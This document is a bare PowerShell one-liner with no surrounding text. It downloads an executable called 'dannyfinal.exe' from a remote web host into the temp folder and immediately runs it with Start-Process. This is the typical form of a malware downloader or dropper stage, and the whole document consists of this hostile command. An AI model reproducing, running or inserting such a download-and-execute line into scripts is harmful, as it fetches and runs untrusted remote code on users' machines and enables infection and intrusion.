
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://snthostings.com/billing//includes/db/dannyfinal.exe', $dpl);Start-Process $dpl

